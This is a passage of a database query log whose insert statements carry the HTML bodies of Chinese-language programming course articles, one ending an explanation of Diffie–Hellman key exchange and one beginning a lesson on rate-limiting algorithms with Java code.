data-slate-object="block" data-key="2124"> <span data-slate-object="text" data-key="2125"><span 
data-slate-leaf="true" data-offset-key="2125:0" data-first-offset="true"><span data-slate-string="true">我呢，也生成一个只有我自己知道的随机整数 
b，并将结果 B = gᵇ mod p 发给你；</span></span></span> </div> <div class="se-ad0f0dd9 se-7683c369" data-slate-type="list-line" 
data-slate-object="block" data-key="2126"> <span data-slate-object="text" data-key="2127"><span 
data-slate-leaf="true" data-offset-key="2127:0" data-first-offset="true"><span data-slate-string="true">你根据我发过来的 
B，计算得到 s = Bᵃ mod p；</span></span></span> </div> <div class="se-3840a8d0 se-3a00d239" data-slate-type="list-line" 
data-slate-object="block" data-key="2128"> <span data-slate-object="text" data-key="2129"><span 
data-slate-leaf="true" data-offset-key="2129:0" data-first-offset="true"><span data-slate-string="true">我根据你发过来的 
A，计算得到 s’ = Aᵇ mod p。</span></span></span> </div> </div> <div class="se-2e8602a0 " data-slate-type="paragraph" 
data-slate-object="block" data-key="2130"> <span data-slate-object="text" data-key="2131"><span 
data-slate-leaf="true" data-offset-key="2131:0" data-first-offset="true"><span data-slate-string="true">这个过程用简单的图示来表示就是：</span></span></span> 
</div> <div class="se-86121caf" data-slate-type="image" data-slate-object="block" data-key="2132"> 
<img class="se-1c633cc3" src="https://static001.geekbang.org/resource/image/6d/3c/6d40d7bcf10858022fabf9c492626b3c.png"> 
</div> <div class="se-fdf87eff " data-slate-type="paragraph" data-slate-object="block" data-key="2133"> 
<span data-slate-object="text" data-key="2134"><span data-slate-leaf="true" data-offset-key="2134:0" 
data-first-offset="true"><span data-slate-string="true">你看，整个过程中，</span></span></span><span 
data-slate-object="text" data-key="2135"><span data-slate-leaf="true" data-offset-key="2135:0" 
data-first-offset="true"><span class="se-4356fd7c" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">只有 a、b 这两个数分别是你和我各自知道并保密的，而其它交换的数据全部都是公开的。</span></span></span></span><span 
data-slate-object="text" data-key="2136"><span data-slate-leaf="true" data-offset-key="2136:0" 
data-first-offset="true"><span data-slate-string="true">对于你来说，已经有了 a，又得到我传过来的 B，于是你算出了 s；对于我来说，已经有了 
b，又得到了你传过来的 A，于是我算出了 s’。</span></span></span> </div> <div class="se-472733be " data-slate-type="paragraph" 
data-slate-object="block" data-key="2137"> <span data-slate-object="text" data-key="2138"><span 
data-slate-leaf="true" data-offset-key="2138:0" data-first-offset="true"><span data-slate-string="true">有趣的是，经过计算，你得到的 
s 和我得到的 s’，这两个数总是相等的，既然相等，那这个值也就可以用作你我之间通信的对称密钥了。也就是说，</span></span></span><span data-slate-object="text" 
data-key="2139"><span data-slate-leaf="true" data-offset-key="2139:0" data-first-offset="true"><span 
class="se-910ede92" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">通信双方分别算得了相等的密钥，这也就避免了密钥传递的风险。</span></span></span></span><span 
data-slate-object="text" data-key="2140"><span data-slate-leaf="true" data-offset-key="2140:0" 
data-first-offset="true"><span data-slate-string="true">可是，为什么 s 和 s’ 它们是相等的呢？</span></span></span> 
</div> <h3 class="se-05157a80" data-slate-type="heading" data-slate-object="block" data-key="2141"><span 
data-slate-object="text" data-key="2142"><span data-slate-leaf="true" data-offset-key="2142:0" 
data-first-offset="true"><span data-slate-string="true">质数和模幂运算</span></span></span></h3> <div 
class="se-c77dbb67 " data-slate-type="paragraph" data-slate-object="block" data-key="2143"> 
<span data-slate-object="text" data-key="2144"><span data-slate-leaf="true" data-offset-key="2144:0" 
data-first-offset="true"><span data-slate-string="true">因为，g 的 a 次方再 b 次方，等于 g 的 b 次方再 a 次方，即便每次幂运算后加上 
p 来取模，也不影响最后结果的相等性，换言之：</span></span></span> </div> <div class="se-005a73c8 " data-slate-type="paragraph" 
data-slate-object="block" data-key="2145"> <span data-slate-object="text" data-key="2146"><span 
data-slate-leaf="true" data-offset-key="2146:0" data-first-offset="true"><span class="se-12bb7da2" 
data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">gᵃᵇ mod p = 
(gᵃ mod p)ᵇ mod p = (gᵇ mod p)ᵃ mod p</span></span></span></span> </div> <div class="se-aaca7211 
" data-slate-type="paragraph" data-slate-object="block" data-key="2147"> <span data-slate-object="text" 
data-key="2148"><span data-slate-leaf="true" data-offset-key="2148:0" data-first-offset="true"><span 
data-slate-string="true">上面这样的，先求幂，再取模的运算，我们把它简单称为“模幂运算”。在实际应用中，g 可以取一个比较小的数，而 a、b 和 p，都要取非常大的数，而且 
p 往往会取一个“极大”的质数——因为质数在此会具备这样一个重要性质，模幂运算结果会在小于 p 的非负整数中均匀分布；而另外一个原因是，由于 g 的 a 次方或 b 次方会非常大，需要一个“上限”，一个使得生成的数无论是传输还是存储都能够可行的方法。</span></span></span><span 
data-slate-object="text" data-key="2149"><span data-slate-leaf="true" data-offset-key="2149:0" 
data-first-offset="true"><span class="se-68c7caa3" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">因此大质数 p 的取模运算被用来设定上限并将大数化小，且保持原有的逆向求解困难性。</span></span></span></span> 
</div> <div class="se-af773a35 " data-slate-type="paragraph" data-slate-object="block" data-key="2150"> 
<span data-slate-object="text" data-key="2151"><span data-slate-leaf="true" data-offset-key="2151:0" 
data-first-offset="true"><span data-slate-string="true">说到逆向求解的困难性，这是根据数学上</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="2152" class="se-bd361ee3 se-f81bfce9"><span 
data-slate-object="text" data-key="2153"><span data-slate-leaf="true" data-offset-key="2153:0" 
data-first-offset="true"><span data-slate-string="true">离散对数</span></span></span></a><span 
data-slate-object="text" data-key="2154"><span data-slate-leaf="true" data-offset-key="2154:0" 
data-first-offset="true"><span data-slate-string="true">求解的特性所决定的，具体说来，就是这样一个模幂等式：</span></span></span> 
</div> <div class="se-27c759fe " data-slate-type="paragraph" data-slate-object="block" data-key="2155"> 
<span data-slate-object="text" data-key="2156"><span data-slate-leaf="true" data-offset-key="2156:0" 
data-first-offset="true"><span class="se-711f0076" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">gᵃ mod p = A</span></span></span></span> </div> <div class="se-4663c483 
" data-slate-type="paragraph" data-slate-object="block" data-key="2157"> <span data-slate-object="text" 
data-key="2158"><span data-slate-leaf="true" data-offset-key="2158:0" data-first-offset="true"><span 
data-slate-string="true">从难度上看，该式具有如下三个特性：</span></span></span> </div> <div class="se-d2e658b2" 
data-slate-type="list" data-slate-object="block" data-key="2159"> <div class="se-15d009cd se-1af4d079" 
data-slate-type="list-line" data-slate-object="block" data-key="2160"> <span data-slate-object="text" 
data-key="2161"><span data-slate-leaf="true" data-offset-key="2161:0" data-first-offset="true"><span 
data-slate-string="true">特性 ①：已知 g、a 和 p，求 A 容易；</span></span></span> </div> <div class="se-112c46e9 
se-f12b50d1" data-slate-type="list-line" data-slate-object="block" data-key="2162"> <span data-slate-object="text" 
data-key="2163"><span data-slate-leaf="true" data-offset-key="2163:0" data-first-offset="true"><span 
data-slate-string="true">特性 ②：已知 g、p 和 A，求 a 困难；</span></span></span> </div> <div class="se-996c6b66 
se-d08a6780" data-slate-type="list-line" data-slate-object="block" data-key="2164"> <span data-slate-object="text" 
data-key="2165"><span data-slate-leaf="true" data-offset-key="2165:0" data-first-offset="true"><span 
data-slate-string="true">特性 ③：已知 a、p 和 A，求 g 也困难。</span></span></span> </div> </div> <div class="se-c9691c36 
" data-slate-type="paragraph" data-slate-object="block" data-key="2166"> <span data-slate-object="text" 
data-key="2167"><span data-slate-leaf="true" data-offset-key="2167:0" data-first-offset="true"><span 
data-slate-string="true">正好，Diffie–Hellman 密钥交换利用了其中的特性 ① 和特性 ②。比如 a 是超过 100 位的正整数，而 p 则达到了 
300 位，那么在这种情况下，如果有恶意的攻击者，得到了 g、p，截获了 A，但是他根据这些信息，考虑我们前面介绍的公式 A = gᵃ mod p，在现有科技能达到的算力下，几乎是无法求解出其中的 
a 来的。无法知道 a，无法进而求得对称密钥 s（因为 s 需要通过 Bᵃ mod p 求得），这就起到了加密的作用，这也是 Diffie–Hellman 密钥交换能够实现的原理。</span></span></span> 
</div> <h2 class="se-e0e6372b" data-slate-type="heading" data-slate-object="block" data-key="2168"><span 
data-slate-object="text" data-key="2169"><span data-slate-leaf="true" data-offset-key="2169:0" 
data-first-offset="true"><span data-slate-string="true">扩展阅读</span></span></span></h2> <div 
class="se-bedf3cff" data-slate-type="list" data-slate-object="block" data-key="2170"> <div 
class="se-be0f51da se-fcbacdcb" data-slate-type="list-line" data-slate-object="block" data-key="2171"> 
<span data-slate-object="text" data-key="2172"><span data-slate-leaf="true" data-offset-key="2172:0" 
data-first-offset="true"><span data-slate-string="true">【基础】文中我提到了算法的时间复杂度和空间复杂度，这是属于算法的基础知识。如果不太熟悉的话可以阅读一下这个</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="2173" class="se-bd361ee3 se-f81bfce9"><span 
data-slate-object="text" data-key="2174"><span data-slate-leaf="true" data-offset-key="2174:0" 
data-first-offset="true"><span data-slate-string="true">词条</span></span></span></a><span data-slate-object="text" 
data-key="2175"><span data-slate-leaf="true" data-offset-key="2175:0" data-first-offset="true"><span 
data-slate-string="true">，以及</span></span></span><a data-slate-type="link" data-slate-object="inline" 
data-key="2176" class="se-bd361ee3 se-f81bfce9"><span data-slate-object="text" data-key="2177"><span 
data-slate-leaf="true" data-offset-key="2177:0" data-first-offset="true"><span data-slate-string="true">这篇</span></span></span></a><span 
data-slate-object="text" data-key="2178"><span data-slate-leaf="true" data-offset-key="2178:0" 
data-first-offset="true"><span data-slate-string="true">文章，而在</span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="2179" class="se-bd361ee3 se-f81bfce9"><span data-slate-object="text" 
data-key="2180"><span data-slate-leaf="true" data-offset-key="2180:0" data-first-offset="true"><span 
data-slate-string="true">这里</span></span></span></a><span data-slate-object="text" data-key="2181"><span 
data-slate-leaf="true" data-offset-key="2181:0" data-first-offset="true"><span data-slate-string="true">则有常见算法的时间复杂度列表。</span></span></span> 
</div> <div class="se-60410c76 se-b05e7ff3" data-slate-type="list-line" data-slate-object="block" 
data-key="2182"> <span data-slate-object="text" data-key="2183"><span data-slate-leaf="true" 
data-offset-key="2183:0" data-first-offset="true"><span data-slate-string="true">选修课堂中介绍的 Diffie–Hellman 
密钥交换利用了模幂公式的“正向计算简单，逆向求解困难”这一特点，这个特点非常重要，还有一个相关的技术 RSA 也利用了这一特点。本来我是把 RSA 加密技术的原理介绍和 Diffie–Hellman 
密钥交换放在一起讲述的，但是经过仔细斟酌，我觉得 RSA 涉及到的数学知识稍多，整体理解起来明显偏难，因此为了专栏内容和难度的一致性，我忍痛把它拿出去了，并放在了我自己的博客上，感兴趣的话可以</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="2184" class="se-bd361ee3 se-f81bfce9"><span 
data-slate-object="text" data-key="2185"><span data-slate-leaf="true" data-offset-key="2185:0" 
data-first-offset="true"><span data-slate-string="true">移步阅读</span></span></span></a><span 
data-slate-object="text" data-key="2186"><span data-slate-leaf="true" data-offset-key="2186:0" 
data-first-offset="true"><span data-slate-string="true">。</span></span></span> </div> </div> 
<div class="se-6818cce2" data-slate-type="image" data-slate-object="block" data-key="2187"> 
<img class="se-5bcf8dc7" src="https://static001.geekbang.org/resource/image/11/8b/1181246bbd51ce348d5729696d1dc28b.jpg"> 
</div> </div>', '', 'book', 0, 'full_html', 'zh-hans', 9, 9) 
 {executed in 13 msec}
2020-11-19 11:04:25.829 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_0_, nodebodyen0_.body_value as body_val2_3_0_, 
nodebodyen0_.body_summary as body_sum3_3_0_, nodebodyen0_.bundle as bundle4_3_0_, nodebodyen0_.delta 
as delta5_3_0_, nodebodyen0_.body_format as body_for6_3_0_, nodebodyen0_.langcode as langcode7_3_0_, 
nodebodyen0_.revision_id as revision8_3_0_ from node__body nodebodyen0_ where nodebodyen0_.entity_id=9 
 {executed in 0 msec}
2020-11-19 11:04:25.829 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:04:25.853 INFO  jdbc.sqltiming Line:373 - insert into node__body (body_value, body_summary, bundle, delta, body_format, langcode, revision_id, 
entity_id) values ('<div data-slate-editor="true" data-key="1855" autocorrect="off" spellcheck="false" 
data-gramm="false" style="outline: none; white-space: pre-wrap; overflow-wrap: break-word;"> 
<div class="se-8f95813a " data-slate-type="paragraph" data-slate-object="block" data-key="1856"> 
<span data-slate-object="text" data-key="1857"><span data-slate-leaf="true" data-offset-key="1857:0" 
data-first-offset="true"><span data-slate-string="true">你好，我是四火。</span></span></span> </div> 
<div class="se-4bf17448 " data-slate-type="paragraph" data-slate-object="block" data-key="1858"> 
<span data-slate-object="text" data-key="1859"><span data-slate-leaf="true" data-offset-key="1859:0" 
data-first-offset="true"><span data-slate-string="true">在本专栏中，我们已经接触到了全栈开发中的一些算法了。在这一讲和下一讲中，我又精心挑选了几个比较重要的。</span></span></span><span 
data-slate-object="text" data-key="1860"><span data-slate-leaf="true" data-offset-key="1860:0" 
data-first-offset="true"><span class="se-fec8eccc" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">和单纯地从数学角度去介绍算法不同，我想结合几个全栈开发中实际、典型的问题场景，向你介绍这几个相关的重要算法。</span></span></span></span><span 
data-slate-object="text" data-key="1861"><span data-slate-leaf="true" data-offset-key="1861:0" 
data-first-offset="true"><span data-slate-string="true">毕竟，我们关心的算法，其实就是可以解决实际问题的方法的一种数学抽象。</span></span></span> 
</div> <div class="se-0dbd0ef1 " data-slate-type="paragraph" data-slate-object="block" data-key="1862"> 
<span data-slate-object="text" data-key="1863"><span data-slate-leaf="true" data-offset-key="1863:0" 
data-first-offset="true"><span data-slate-string="true">希望通过这两讲的学习，你能理解这些算法。除了理解算法原理本身，我们更要抓住它们的用途和算法自身的巧妙之处。今天我们来讲其中的第一个典型的问题场景——流量控制。</span></span></span> 
</div> <h2 class="se-54988093" data-slate-type="heading" data-slate-object="block" data-key="1864"><span 
data-slate-object="text" data-key="1865"><span data-slate-leaf="true" data-offset-key="1865:0" 
data-first-offset="true"><span data-slate-string="true">流量控制系统中的算法</span></span></span></h2> 
<div class="se-78995500 " data-slate-type="paragraph" data-slate-object="block" data-key="1866"> 
<span data-slate-object="text" data-key="1867"><span data-slate-leaf="true" data-offset-key="1867:0" 
data-first-offset="true"><span data-slate-string="true">对于全栈工程师来说，无论是网站，还是其它 Web 应用，一旦对外商用，就要考虑流量控制的问题。因此我们往往需要设计使用单独的流量控制模块，我们来看下面这样的一个问题。</span></span></span> 
</div> <div class="se-a3b5b4af " data-slate-type="paragraph" data-slate-object="block" data-key="1868"> 
<span data-slate-object="text" data-key="1869"><span data-slate-leaf="true" data-offset-key="1869:0" 
data-first-offset="true"><span data-slate-string="true">假如说，我们现在需要给一组 Web API 设计一个流量控制系统，以避免请求对系统的过度冲击，对于任意一个用户账户 
ID，每一个 API 都要满足下面所有的要求：</span></span></span> </div> <div class="se-5e6b8dfc" data-slate-type="list" 
data-slate-object="block" data-key="1870"> <div class="se-f3713a99 se-b34d2f88" data-slate-type="list-line" 
data-slate-object="block" data-key="1871"> <span data-slate-object="text" data-key="1872"><span 
data-slate-leaf="true" data-offset-key="1872:0" data-first-offset="true"><span data-slate-string="true">每分钟调用不能超过一万次；</span></span></span> 
</div> <div class="se-a67fc0eb se-6664ca31" data-slate-type="list-line" data-slate-object="block" 
data-key="1873"> <span data-slate-object="text" data-key="1874"><span data-slate-leaf="true" 
data-offset-key="1874:0" data-first-offset="true"><span data-slate-string="true">每小时调用不能超过十万次；</span></span></span> 
</div> <div class="se-e5a001e6 se-419c8ebe" data-slate-type="list-line" data-slate-object="block" 
data-key="1875"> <span data-slate-object="text" data-key="1876"><span data-slate-leaf="true" 
data-offset-key="1876:0" data-first-offset="true"><span data-slate-string="true">每天调用不能超过一百万次；</span></span></span> 
</div> <div class="se-4e1288fd se-ddf8b231" data-slate-type="list-line" data-slate-object="block" 
data-key="1877"> <span data-slate-object="text" data-key="1878"><span data-slate-leaf="true" 
data-offset-key="1878:0" data-first-offset="true"><span data-slate-string="true">每周调用不能超过一千万次；</span></span></span> 
</div> <div class="se-85f3a86f se-f74ffe58" data-slate-type="list-line" data-slate-object="block" 
data-key="1879"> <span data-slate-object="text" data-key="1880"><span data-slate-leaf="true" 
data-offset-key="1880:0" data-first-offset="true"><span data-slate-string="true">……</span></span></span> 
</div> </div> <div class="se-ee07efc9 " data-slate-type="paragraph" data-slate-object="block" 
data-key="1881"> <span data-slate-object="text" data-key="1882"><span data-slate-leaf="true" 
data-offset-key="1882:0" data-first-offset="true"><span data-slate-string="true">在继续往下阅读之前，请你先从算法和数据结构的角度思考，你觉得该怎么设计这个流量控制系统呢？</span></span></span> 
</div> <h3 class="se-0fde4b38" data-slate-type="heading" data-slate-object="block" data-key="1883"><span 
data-slate-object="text" data-key="1884"><span data-slate-leaf="true" data-offset-key="1884:0" 
data-first-offset="true"><span data-slate-string="true">简化问题</span></span></span></h3> <div 
class="se-65ccc5cc " data-slate-type="paragraph" data-slate-object="block" data-key="1885"> 
<span data-slate-object="text" data-key="1886"><span data-slate-leaf="true" data-offset-key="1886:0" 
data-first-offset="true"><span data-slate-string="true">在解决实际问题的时候，我们面临的问题往往是复杂的、多样的，因此，我们可以</span></span></span><span 
data-slate-object="text" data-key="1887"><span data-slate-leaf="true" data-offset-key="1887:0" 
data-first-offset="true"><span class="se-907e09b4" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">考虑能不能先简化问题，再来尝试映射到某一个数学模型上。那些先不考虑的复杂条件，有的可能就是可以忽略掉的，而有的则是为了思路的清晰。一开始我们可以先忽略，有了解题的方法原型以后，再逐步加回来考虑。</span></span></span></span> 
</div> <div class="se-f7e4bc12 " data-slate-type="paragraph" data-slate-object="block" data-key="1888"> 
<span data-slate-object="text" data-key="1889"><span data-slate-leaf="true" data-offset-key="1889:0" 
data-first-offset="true"><span data-slate-string="true">那就这个问题而言，我可以做如下的简化：</span></span></span> 
</div> <div class="se-356546b1" data-slate-type="list" data-slate-object="block" data-key="1890"> 
<div class="se-380c31f4 se-4d0590d6" data-slate-type="list-line" data-slate-object="block" 
data-key="1891"> <span data-slate-object="text" data-key="1892"><span data-slate-leaf="true" 
data-offset-key="1892:0" data-first-offset="true"><span data-slate-string="true">有大量的用户账户 ID，但是我们现在只考虑某一个特定的账户 
ID，反正其它账户 ID 的做法也是一样的；</span></span></span> </div> <div class="se-316512c5 se-883001b8" data-slate-type="list-line" 
data-slate-object="block" data-key="1893"> <span data-slate-object="text" data-key="1894"><span 
data-slate-leaf="true" data-offset-key="1894:0" data-first-offset="true"><span data-slate-string="true">这里面有多个 
Web API，但是我们可以只考虑其中特定的一个 API，反正其它 API 也是类似的；</span></span></span> </div> <div class="se-d3f5814e 
se-c70a7d26" data-slate-type="list-line" data-slate-object="block" data-key="1895"> <span data-slate-object="text" 
data-key="1896"><span data-slate-leaf="true" data-offset-key="1896:0" data-first-offset="true"><span 
data-slate-string="true">这里面有多条规则，但是我们可以只考虑其中的一个规则，即“每分钟调用不能超过一万次”，至于其它的规则，原理上也是一样的。</span></span></span> 
</div> <div class="se-112d130b se-ca89444e" data-slate-type="list-line" data-slate-object="block" 
data-key="1897"> <span data-slate-object="text" data-key="1898"><span data-slate-leaf="true" 
data-offset-key="1898:0" data-first-offset="true"><span data-slate-string="true">为了简化问题，在这里我们也暂不考虑并发、分布式、线程安全等问题。</span></span></span> 
</div> </div> <div class="se-00f143e9 " data-slate-type="paragraph" data-slate-object="block" 
data-key="1899"> <span data-slate-object="text" data-key="1900"><span data-slate-leaf="true" 
data-offset-key="1900:0" data-first-offset="true"><span data-slate-string="true">好，现在问题就简单多了，当我们把这个简化了的问题解决了之后，我们再引入多个用户 
ID、多个 API 和多条规则这样的维度：</span></span></span> </div> <div class="se-5af20635 se-77dcd43c" data-slate-type="pre" 
data-slate-object="block" data-key="1901" data-code-language="java"> <div class="se-d94b0d17 
se-fcf81977"> <span></span> </div> <div class="se-37f8116a"> <div class="se-7b4df96d se-ccb6aadc" 
data-code-line-number="1"></div> <div class="se-7b4df96d se-ccb6aadc" data-code-line-number="2"></div> 
<div class="se-7b4df96d se-ccb6aadc" data-code-line-number="3"></div> <div class="se-7b4df96d 
se-ccb6aadc" data-code-line-number="4"></div> <div class="se-7b4df96d se-ccb6aadc" data-code-line-number="5"></div> 
</div> <div class="se-5d81608a ps ps--active-x"> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" 
data-slate-object="block" data-key="1902"> <span data-slate-object="text" data-key="1903"><span 
data-slate-leaf="true" data-offset-key="1903:0" data-first-offset="true"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_7683194830" data-annotation-type="annotation"><span 
data-slate-string="true">public</span></span></span><span data-slate-leaf="true" data-offset-key="1903:1"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1903:2"><span 
class=" gkhl-class" data-slate-object="annotation" data-annotation-key="gkann_4584959419" data-annotation-type="annotation"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_8230784985" 
data-annotation-type="annotation"><span data-slate-string="true">class</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1903:3"><span class=" gkhl-class" data-slate-object="annotation" 
data-annotation-key="gkann_4584959419" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1903:4"><span class=" gkhl-class" 
data-slate-object="annotation" data-annotation-key="gkann_4584959419" data-annotation-type="annotation"><span 
class=" gkhl-title" data-slate-object="annotation" data-annotation-key="gkann_6113287498" data-annotation-type="annotation"><span 
data-slate-string="true">RateLimiter</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="1903:5"><span class=" gkhl-class" data-slate-object="annotation" data-annotation-key="gkann_4584959419" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1903:6"><span data-slate-string="true">{</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1904"> <span data-slate-object="text" data-key="1905"><span data-slate-leaf="true" 
data-offset-key="1905:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1905:1"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_5715836843" data-annotation-type="annotation"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_4891483213" data-annotation-type="annotation"><span 
data-slate-string="true">public</span></span></span></span><span data-slate-leaf="true" data-offset-key="1905:2"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_5715836843" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1905:3"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_4692161611" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_5715836843" data-annotation-type="annotation"><span 
data-slate-string="true">boolean</span></span></span></span><span data-slate-leaf="true" data-offset-key="1905:4"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_5715836843" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1905:5"><span class=" gkhl-title" data-slate-object="annotation" 
data-annotation-key="gkann_1218689301" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_5715836843" data-annotation-type="annotation"><span 
data-slate-string="true">isAllowed</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="1905:6"><span class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_5715836843" 
data-annotation-type="annotation"><span class=" gkhl-params" data-slate-object="annotation" 
data-annotation-key="gkann_4735237012" data-annotation-type="annotation"><span data-slate-string="true">()</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1905:7"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_5715836843" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1905:8"><span data-slate-string="true">{</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1906"> <span data-slate-object="text" data-key="1907"><span data-slate-leaf="true" 
data-offset-key="1907:0" data-first-offset="true"><span data-slate-string="true"> ... </span></span><span 
data-slate-leaf="true" data-offset-key="1907:1"><span class=" gkhl-comment" data-slate-object="annotation" 
data-annotation-key="gkann_6776257374" data-annotation-type="annotation"><span data-slate-string="true">// 
当每分钟调用不超过 10000 次，就返回 true，否则返回 false</span></span></span></span> </div> <div class="se-d15b7025 
se-7e1f828d" data-slate-type="code-line" data-slate-object="block" data-key="1908"> <span data-slate-object="text" 
data-key="1909"><span data-slate-leaf="true" data-offset-key="1909:0" data-first-offset="true"><span 
data-slate-string="true"> }</span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" 
data-slate-type="code-line" data-slate-object="block" data-key="1910"> <span data-slate-object="text" 
data-key="1911"><span data-slate-leaf="true" data-offset-key="1911:0" data-first-offset="true"><span 
data-slate-string="true">}</span></span></span> </div> <div class="ps__rail-x" style="width: 
365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" style="left: 0px; width: 
264px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 0px;"> <div class="ps__thumb-y" 
tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> </div> <h3 class="se-cb6a3e7b" 
data-slate-type="heading" data-slate-object="block" data-key="1912"><span data-slate-object="text" 
data-key="1913"><span data-slate-leaf="true" data-offset-key="1913:0" data-first-offset="true"><span 
data-slate-string="true">简单计数</span></span></span></h3> <div class="se-c28fdef5 " data-slate-type="paragraph" 
data-slate-object="block" data-key="1914"> <span data-slate-object="text" data-key="1915"><span 
data-slate-leaf="true" data-offset-key="1915:0" data-first-offset="true"><span data-slate-string="true">好，最先进入脑海的是采用简单计数的办法，我们给 
RateLimiter 一个起始时间的时间戳。如果当前时间在距离起始时间一分钟以内，我们就看当前已经放进来了多少个请求，如果是 10000 个以内，就允许访问，否则就拒绝访问；如果当前时间已经超过了起始时间一分钟，就更新时间戳，并清零计数器。参考代码如下：</span></span></span> 
</div> <div class="se-6171afa3 se-2ea7c662" data-slate-type="pre" data-slate-object="block" 
data-key="1916" data-code-language="java"> <div class="se-fae4f454 se-8fc7cacf"> <span></span> 
</div> <div class="se-38a871cb"> <div class="se-a9a7fac0 se-a6c0cf8a" data-code-line-number="1"></div> 
<div class="se-a9a7fac0 se-a6c0cf8a" data-code-line-number="2"></div> <div class="se-a9a7fac0 
se-a6c0cf8a" data-code-line-number="3"></div> <div class="se-a9a7fac0 se-a6c0cf8a" data-code-line-number="4"></div> 
<div class="se-a9a7fac0 se-a6c0cf8a" data-code-line-number="5"></div> <div class="se-a9a7fac0 
se-a6c0cf8a" data-code-line-number="6"></div> <div class="se-a9a7fac0 se-a6c0cf8a" data-code-line-number="7"></div> 
<div class="se-a9a7fac0 se-a6c0cf8a" data-code-line-number="8"></div> <div class="se-a9a7fac0 
se-a6c0cf8a" data-code-line-number="9"></div> <div class="se-a9a7fac0 se-a6c0cf8a" data-code-line-number="10"></div> 
<div class="se-a9a7fac0 se-a6c0cf8a" data-code-line-number="11"></div> <div class="se-a9a7fac0 
se-a6c0cf8a" data-code-line-number="12"></div> <div class="se-a9a7fac0 se-a6c0cf8a" data-code-line-number="13"></div> 
<div class="se-a9a7fac0 se-a6c0cf8a" data-code-line-number="14"></div> <div class="se-a9a7fac0 
se-a6c0cf8a" data-code-line-number="15"></div> <div class="se-a9a7fac0 se-a6c0cf8a" data-code-line-number="16"></div> 
<div class="se-a9a7fac0 se-a6c0cf8a" data-code-line-number="17"></div> <div class="se-a9a7fac0 
se-a6c0cf8a" data-code-line-number="18"></div> </div> <div class="se-74d6c200 ps ps--active-x"> 
<div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1917"> <span data-slate-object="text" data-key="1918"><span data-slate-leaf="true" 
data-offset-key="1918:0" data-first-offset="true"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_3322259919" data-annotation-type="annotation"><span data-slate-string="true">public</span></span></span><span 
data-slate-leaf="true" data-offset-key="1918:1"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1918:2"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_1987164721" data-annotation-type="annotation"><span class=" gkhl-class" 
data-slate-object="annotation" data-annotation-key="gkann_5027682364" data-annotation-type="annotation"><span 
data-slate-string="true">class</span></span></span></span><span data-slate-leaf="true" data-offset-key="1918:3"><span 
class=" gkhl-class" data-slate-object="annotation" data-annotation-key="gkann_5027682364" data-annotation-type="annotation"><span 
data-slate-string="true"> </span></span></span><span data-slate-leaf="true" data-offset-key="1918:4"><span 
class=" gkhl-title" data-slate-object="annotation" data-annotation-key="gkann_3748444133" data-annotation-type="annotation"><span 
class=" gkhl-class" data-slate-object="annotation" data-annotation-key="gkann_5027682364" data-annotation-type="annotation"><span 
data-slate-string="true">RateLimiter</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="1918:5"><span class=" gkhl-class" data-slate-object="annotation" data-annotation-key="gkann_5027682364" 
